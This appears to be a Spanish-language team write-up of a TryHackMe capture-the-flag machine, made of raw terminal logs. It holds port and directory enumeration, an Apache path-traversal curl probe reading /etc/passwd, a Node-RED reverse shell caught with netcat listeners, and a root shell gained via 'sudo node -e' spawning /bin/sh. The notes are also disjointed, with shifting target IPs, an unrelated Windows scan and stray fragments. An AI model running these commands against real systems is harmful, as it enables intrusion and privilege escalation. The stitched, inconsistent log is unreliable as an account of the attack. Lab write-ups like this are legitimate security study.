# CTF_TryHackMe_Machine_Violet_Team
This repository contains our notes, exploits, and strategies for solving the CTF machine on TryHackMe. Our goal is to document the attack process, share knowledge, and improve our cybersecurity skills as a team. 🚀💀
#First Commands and Initial Questions
Here are the first six questions we encountered and the initial commands we used to begin our enumeration:


┌──(kali㉿kali)-[~]
└─$ nmap -v -A -sC -Pn 10.10.26.176 -p-
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-01 14:01 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 14:01
Completed NSE at 14:01, 0.00s elapsed
Initiating NSE at 14:01
Completed NSE at 14:01, 0.00s elapsed
Initiating NSE at 14:01
Completed NSE at 14:01, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 14:01
Completed Parallel DNS resolution of 1 host. at 14:01, 0.01s elapsed
Initiating SYN Stealth Scan at 14:01
Scanning 10.10.26.176 [65535 ports]
Discovered open port 22/tcp on 10.10.26.176
Discovered open port 80/tcp on 10.10.26.176
SYN Stealth Scan Timing: About 39.27% done; ETC: 14:03 (0:00:48 remaining)
Discovered open port 1880/tcp on 10.10.26.176
Completed SYN Stealth Scan at 14:03, 73.93s elapsed (65535 total ports)
Initiating Service scan at 14:03
Scanning 3 services on 10.10.26.176
Completed Service scan at 14:03, 12.67s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 10.10.26.176
Initiating Traceroute at 14:03
Completed Traceroute at 14:03, 0.10s elapsed
Initiating Parallel DNS resolution of 2 hosts. at 14:03
Completed Parallel DNS resolution of 2 hosts. at 14:03, 0.09s elapsed
NSE: Script scanning 10.10.26.176.
Initiating NSE at 14:03
Completed NSE at 14:03, 1.93s elapsed
Initiating NSE at 14:03
Completed NSE at 14:03, 0.21s elapsed
Initiating NSE at 14:03
Completed NSE at 14:03, 0.00s elapsed
Nmap scan report for 10.10.26.176
Host is up (0.054s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.56 (Debian)
1880/tcp open  http    Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 818DD6AFD0D0F9433B21774F89665EEA
|_http-title: Node-RED
|_http-cors: GET POST PUT DELETE
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Uptime guess: 6.023 days (since Wed Mar 26 13:30:08 2025)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=265 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 9979/tcp)
HOP RTT      ADDRESS
1   93.27 ms 10.8.0.1
2   93.19 ms 10.10.26.176

NSE: Script Post-scanning.
Initiating NSE at 14:03
Completed NSE at 14:03, 0.00s elapsed
Initiating NSE at 14:03
Completed NSE at 14:03, 0.00s elapsed
Initiating NSE at 14:03
Completed NSE at 14:03, 0.00s elapsed
Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.95 seconds
           Raw packets sent: 68506 (3.015MB) | Rcvd: 68237 (2.730MB)

# Se busca la vulnearvilidad de puerto 1880

# Se realiza scaneo atreves de Nessus encontrando una vulnerabilidad del 9.8 en Apache. Se genera captura

# Se encuentra ka vulnerabilidad y e procede a explotarlas 

curl -v --path-as-is "http://10.10.227.121/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" no existen vulnerabilidades se intenta por el puerto 1880

curl -v http://10.10.227.121:1880/

*   Trying 10.10.227.121:1880...
* Connected to 10.10.227.121 (10.10.227.121) port 1880
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 10.10.227.121:1880
> User-Agent: curl/8.12.1
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Access-Control-Allow-Origin: *
< Content-Type: text/html; charset=utf-8
< Content-Length: 1710
< ETag: W/"6ae-I+dCfUdVI8zgYXFq+9pylEoBEC4"
< Date: Tue, 01 Apr 2025 23:57:12 GMT
< Connection: keep-alive
< Keep-Alive: timeout=5
< 
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0"/>
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="mobile-web-app-capable" content="yes">
<!--
  Copyright OpenJS Foundation and other contributors, https://openjsf.org/

  Licensed under the Apache License, Version 2.0 (the "License");
  you may not use this file except in compliance with the License.
  You may obtain a copy of the License at

  http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<title>Node-RED</title>
<link rel="icon" type="image/png" href="favicon.ico">
<link rel="mask-icon" href="red&#x2F;images&#x2F;node-red-icon-black.svg" color="#8f0000">
<link rel="stylesheet" href="vendor/jquery/css/base/jquery-ui.min.css?v=3.0.2">
<link rel="stylesheet" href="vendor/font-awesome/css/font-awesome.min.css?v=3.0.2">
<link rel="stylesheet" href="red/style.min.css?v=3.0.2">
<link rel="stylesheet" href="vendor/monaco/style.css?v=3.0.2">
</head>
<body spellcheck="false">
<div id="red-ui-editor"></div>
<script src="vendor/vendor.js?v=3.0.2"></script>
<script src="vendor&#x2F;monaco&#x2F;monaco-bootstrap.js?v=3.0.2"></script>
<script src="red&#x2F;red.min.js?v=3.0.2"></script>
<script src="red&#x2F;main.min.js?v=3.0.2"></script>


</body>
</html>
* Connection #0 to host 10.10.227.121 left intact

┌──(root㉿maritrini)-[/home/kali]
└─# whatweb 10.10.16.249                                                                                  
http://192.168.1.69 [200 OK] Apache[2.4.56], Country[RESERVED][ZZ], HTTPServer[Debian Linux][Apache/2.4.56 (Debian)], IP[192.168.1.69], Title[Apache2 Debian Default Page: It works]
python CVE-2023-48795.py --ip 10.10.215.49
nmap -p- 10.10.215.49
nmap -v -A -sC -Pn 10.10.215.49 -p

# Hacemos un gobustar

gobuster dir -u http://10.10.215.49 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.215.49
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 10701]
/server-status        (Status: 403) [Size: 277]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
                                                    
curl -X GET http://10.10.215.49/.htaccess
curl -X GET http://10.10.215.49/.htpasswd

Zero | Challenge

<IP_ADDRESS>
 From Base64, From Base85, From Hex, From Hexdump
<span data-toggle='tooltip' data-container='body' title='The data could be a valid UTF8 string

ping -T timestamp 10.10.49.2

Después de muchos intentos miralos la posibilidad de NODE RED y encontramos entrando en http://10.10.49.2:1880/#flow/7235b2e6.4cdb9c encontramos NODE RED para su explotación y escucha

Seguimos los pasos de un tutorial https://wiki.delicioushack.com/vulnyx-writeups/node-ctf-writeup-es

arp-scan -l | grep "08"   y como no tenemos privilegios nos elevamos a root 

Hacemos un nmap Para la enumeración de servicios y puertos
nmap -sCV -p- -n --min-rate=4500 10.10.49.2 -oG nmap

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-02 18:20 EDT
Nmap scan report for 192.168.193.1
Host is up (0.0011s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE    VERSION
135/tcp   open  msrpc      Microsoft Windows RPC
3306/tcp  open  mysql      MySQL (unauthorized)
7680/tcp  open  pando-pub?
33060/tcp open  mysqlx     MySQL X protocol listener
MAC Address: 00:50:56:C0:00:08 (VMware)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.03 seconds

wfuzz -c --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.49.2/FUZZ
wfuzz -c --hc=404 -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -z list,html-php-css-js -u 10.10.49.2/FUZZ.FUZ2Z

http://10.10.49.222:1880/#flow/7235b2e6.4cdb9c

EN NODE RED SE CONECTAN EL tcp in de nuestra maquina conececta a través del puerto 3333 con el exe de nuestra maquina y esta se conecta con la maquina final atraves del puerto 6969 teniendo abiertos dos puertos de escucha atraves de netca

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 3333
listening on [any] 3333 ...
connect to [10.8.53.76] from (UNKNOWN) [10.10.49.222] 47528

hacer intro para conectar a la otra terminal de escucha

┌──(kali㉿kali)-[~]
└─$ nc -lvnp 6969
listening on [any] 6969 ...
connect to [10.8.53.76] from (UNKNOWN) [10.10.49.222] 34776
ls
crack_pass
user.txt
ls -la
total 56
drwx------ 5 dev  dev   4096 abr  1 17:56 .
drwxr-xr-x 3 root root  4096 abr  1 17:56 ..
lrwxrwxrwx 1 root root     9 abr 23  2023 .bash_history -> /dev/null
-rw------- 1 dev  dev    220 ene 15  2023 .bash_logout
-rw------- 1 dev  dev   3526 ene 15  2023 .bashrc
-rwxr-xr-x 1 dev  dev  14416 abr  1 17:53 crack_pass
drwxr-xr-x 3 dev  dev   4096 may 16  2023 .local
drwxr-xr-x 4 dev  dev   4096 abr  3 10:54 .node-red
drwxr-xr-x 3 dev  dev   4096 may 16  2023 .npm
-rw------- 1 dev  dev    807 ene 15  2023 .profile
-rw-r--r-- 1 dev  dev     66 may 16  2023 .selected_editor
-r-------- 1 dev  dev     66 abr  1 15:49 user.txt

elevamos privilegios a root para poder abrir los archivos de root
sudo -l
Matching Defaults entries for dev on node:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dev may run the following commands on node:
    (root) NOPASSWD: /usr/bin/node
el resultado nos indica que el usuario <dev> tiene permisos para ejecutar el comando /usr/bin/node como root sin necesidad de proporcionar una contraseña

sudo node -e 'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
id;whoami            
uid=0(root) gid=0(root) grupos=0(root)
rootuid=0(root) gid=0(root) grupos=0(root)
root
al abrir el archivo user.txt nos da una cadena hexadecimal, se prueba en CIBERCHEF 
cat user.txt
# "flag_user"

FLAG DE USUARIO


seguimos buscando para encontrar la del root

cd ..
ls -la
total 68
drwxr-xr-x  18 root root  4096 may 16  2023 .
drwxr-xr-x  18 root root  4096 may 16  2023 ..
lrwxrwxrwx   1 root root     7 ene 15  2023 bin -> usr/bin
drwxr-xr-x   3 root root  4096 may 16  2023 boot
drwxr-xr-x  16 root root  2980 abr  3 08:49 dev
drwxr-xr-x  73 root root  4096 abr  3 11:25 etc
drwxr-xr-x   3 root root  4096 abr  1 17:56 home
lrwxrwxrwx   1 root root    31 may 16  2023 initrd.img -> boot/initrd.img-5.10.0-23-amd64
lrwxrwxrwx   1 root root    31 may 16  2023 initrd.img.old -> boot/initrd.img-5.10.0-21-amd64
lrwxrwxrwx   1 root root     7 ene 15  2023 lib -> usr/lib
lrwxrwxrwx   1 root root     9 ene 15  2023 lib32 -> usr/lib32
lrwxrwxrwx   1 root root     9 ene 15  2023 lib64 -> usr/lib64
lrwxrwxrwx   1 root root    10 ene 15  2023 libx32 -> usr/libx32
drwx------   2 root root 16384 ene 15  2023 lost+found
drwxr-xr-x   3 root root  4096 ene 15  2023 media
drwxr-xr-x   2 root root  4096 ene 15  2023 mnt
drwxr-xr-x   2 root root  4096 ene 15  2023 opt
dr-xr-xr-x 133 root root     0 abr  3 08:49 proc
drwx------   5 root root  4096 abr  1 15:59 root
drwxr-xr-x  18 root root   520 abr  3 08:50 run
lrwxrwxrwx   1 root root     8 ene 15  2023 sbin -> usr/sbin
drwxr-xr-x   2 root root  4096 ene 15  2023 srv
dr-xr-xr-x  13 root root     0 abr  3 08:49 sys
drwxrwxrwt  10 root root  4096 abr  3 08:50 tmp
drwxr-xr-x  14 root root  4096 ene 15  2023 usr
drwxr-xr-x  12 root root  4096 may 16  2023 var
lrwxrwxrwx   1 root root    28 may 16  2023 vmlinuz -> boot/vmlinuz-5.10.0-23-amd64
lrwxrwxrwx   1 root root    28 may 16  2023 vmlinuz.old -> boot/vmlinuz-5.10.0-21-amd64
cd /root
ls -la
total 40
drwx------  5 root root 4096 abr  1 15:59 .
drwxr-xr-x 18 root root 4096 may 16  2023 ..
lrwxrwxrwx  1 root root    9 abr 23  2023 .bash_history -> /dev/null
-rw-------  1 root root 3526 ene 15  2023 .bashrc
drw-------  3 root root 4096 ene 15  2023 .local
drwxr-xr-x  4 root root 4096 may 16  2023 .node-red
drwxr-xr-x  4 dev  root 4096 may 16  2023 .npm
-rw-------  1 root root   39 may 16  2023 .npmrc
-rw-------  1 root root  161 jul  9  2019 .profile
-rw-r--r--  1 root root   37 abr  1 15:56 root.txt
-rw-r--r--  1 root root   66 may 16  2023 .selected_editor
Nos llama la atención el archivo root.xt y procedemos a su apertura

cat root.txt y nos da una flag 
# "flag_root"
 PROBAMOS CON UN echo y nos lanza la FLAG de root

echo "flag_root" | base64 --decode






          
